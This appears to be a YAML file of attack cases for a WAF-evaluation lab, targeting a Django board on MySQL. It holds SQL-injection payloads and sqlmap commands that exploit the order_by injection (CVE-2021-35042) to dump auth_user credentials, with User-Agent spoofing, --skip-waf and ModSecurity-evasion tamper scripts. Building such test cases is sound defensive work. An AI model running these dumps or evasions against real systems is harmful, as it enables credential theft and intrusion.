# The community board is an ordinary Django site on MySQL. It ships no
# challenges and keeps no score, and no case here carries `takes:`. Most of
# these attacks fail against the app itself: the ORM parameterises queries and
# the templates escape output. The exception is the `?sort=` order_by injection
# (CVE-2021-35042), which reaches the raw ORDER BY. board-sqli-orderby-sqlmap
# fires sqlmap at the dotted injection point (`posts_post.id*`) with
# `--level=5 --risk=3`: sqlmap breaks out of the ORDER BY with `)` and finds the
# boolean/time-based blind injection, then dumps auth_user (verified: admin,
# jiwoo, minseo). `--answers=crack=N` declines sqlmap's offer to crack the
# dumped pbkdf2 hashes, which `--batch` accepts and which never finishes; the
# dump took 166 s with no WAF (2026-10-10). `--disable-hashing` did the same but
# Ubuntu's sqlmap 1.8.4 on the OpenStack attacker rejects it. `--flush-session`
# keeps a cached injection or dump on a persistent attacker from answering a
# later run without sending a request. Error-based needs DEBUG, and the
# app runs DEBUG=False, so the blind techniques are the ones that work. Submitting the dump to /loot/ is a
# separate step, not done by the case.
#
# Benign cases matter as much as the attacks. Without them a rule that blocks
# everything scores perfectly. `normal-search-with-apostrophe` is the one that
# separates a rule keyed on a quote from one keyed on injection.

# -- attacks ---------------------------------------------------------------
- name: board-sqli-search
  malicious: true
  stage: initial-compromise
  technique: T1190
  pattern: CAPEC-66
  expect: "SQL"
  correlation: marker
  request:
    method: GET
    path: /search/
    params:
      q: "' OR 1=1--"

- name: board-sqli-login-bypass
  malicious: true
  stage: initial-compromise
  technique: T1190
  pattern: CAPEC-66
  expect: "SQL"
  correlation: marker
  request:
    method: POST
    path: /accounts/login/
    json:
      username: "' OR 1=1--"
      password: "anything"

- name: board-sqli-union-search
  malicious: true
  stage: initial-compromise
  technique: T1190
  pattern: CAPEC-66
  expect: "SQL"
  correlation: marker
  request:
    method: GET
    path: /search/
    params:
      q: "x' UNION SELECT username,password,3 FROM auth_user--"

- name: board-sqli-orderby-sqlmap
  malicious: true
  stage: initial-compromise
  technique: T1190
  pattern: CAPEC-66
  expect: "SQL"
  correlation: marker
  tool: sqlmap
  args: ["-u", "{target}/?sort=posts_post.id*",
         "--technique=BT", "--level=5", "--risk=3", "--dbms=mysql",
         "-D", "board", "-T", "auth_user", "-C", "username,password",
         "--dump", "--batch", "--answers=crack=N", "--flush-session"]

# Lesson 5's first sqlmap run as the learner types it: the injection test
# alone, sqlmap's own User-Agent, no dump. CRS 913100 names the scanner.
- name: board-sqli-orderby-sqlmap-probe
  malicious: true
  stage: initial-compromise
  technique: T1190
  pattern: CAPEC-66
  expect: "SQL"
  correlation: marker
  tool: sqlmap
  args: ["-u", "{target}/?sort=posts_post.id*", "--dbms=mysql", "--technique=BT",
         "--level=5", "--risk=3", "--batch", "--flush-session"]

# The same test with a browser User-Agent: 913100 no longer names the scanner,
# and the payloads are the same, so the 942 rules still decide.
- name: board-sqli-orderby-sqlmap-random-agent
  malicious: true
  stage: initial-compromise
  technique: T1190
  pattern: CAPEC-66
  expect: "SQL"
  correlation: marker
  tool: sqlmap
  args: ["-u", "{target}/?sort=posts_post.id*", "--dbms=mysql", "--technique=BT",
         "--level=5", "--risk=3", "--batch", "--flush-session", "--random-agent"]

# Lesson 6's dump through an over-broad exclusion: a browser User-Agent, and
# --skip-waf so sqlmap sends no WAF-detection probe of its own, which would
# trip the XSS and traversal signatures that still cover other parameters.
- name: board-sqli-orderby-sqlmap-skip-waf
  malicious: true
  stage: initial-compromise
  technique: T1190
  pattern: CAPEC-66
  expect: "SQL"
  correlation: marker
  tool: sqlmap
  args: ["-u", "{target}/?sort=posts_post.id*", "--dbms=mysql", "--technique=BT",
         "--level=5", "--risk=3", "--random-agent", "--skip-waf",
         "-D", "board", "-T", "auth_user", "-C", "username,password",
         "--dump", "--batch", "--answers=crack=N", "--flush-session"]

# The same injection with a browser User-Agent and tamper scripts that rewrite
# spaces, comparison operators and keyword case: a defence that only matches
# sqlmap's own User-Agent or one spelling of the payload lets this one through.
# `--skip-heuristics`: the tampered heuristic probe can pass CRS's inbound
# rules and reach the board, which answers 500; from paranoia level 2 CRS
# 950100 and 959100 refuse that response after its headers are sent, nginx
# drops the connection, and sqlmap ended "unable to connect" with one request
# sent (4 of 10 runs at PL2 on OpenStack, 2026-10-13; 0 of 6 with the flag).
- name: board-sqli-orderby-sqlmap-tamper
  malicious: true
  stage: initial-compromise
  technique: T1190
  pattern: CAPEC-66
  expect: "SQL"
  correlation: marker
  tool: sqlmap
  args: ["-u", "{target}/?sort=posts_post.id*",
         "--technique=BT", "--level=5", "--risk=3", "--dbms=mysql",
         "--random-agent", "--tamper=space2comment,between,randomcase", "--skip-heuristics",
         "-D", "board", "-T", "auth_user", "-C", "username,password",
         "--dump", "--batch", "--answers=crack=N", "--flush-session"]

# The same injection through sqlmap's tamper scripts written against
# ModSecurity: keywords wrapped in MySQL versioned comments (/*!30874AND*/) and
# spaces turned into comments. Held at paranoia level 1 (2026-10-13); no
# lesson or availability scenario fires it, so it is the unseen variant of the
# unknown-attack scenario.
- name: board-sqli-orderby-sqlmap-versioned
  malicious: true
  stage: initial-compromise
  technique: T1190
  pattern: CAPEC-66
  expect: "SQL"
  correlation: marker
  tool: sqlmap
  args: ["-u", "{target}/?sort=posts_post.id*",
         "--technique=BT", "--level=5", "--risk=3", "--dbms=mysql",
         "--random-agent", "--tamper=modsecurityversioned,space2comment", "--skip-heuristics",
         "-D", "board", "-T", "auth_user", "-C", "username,password",
         "--dump", "--batch", "--answers=crack=N", "--flush-session"]

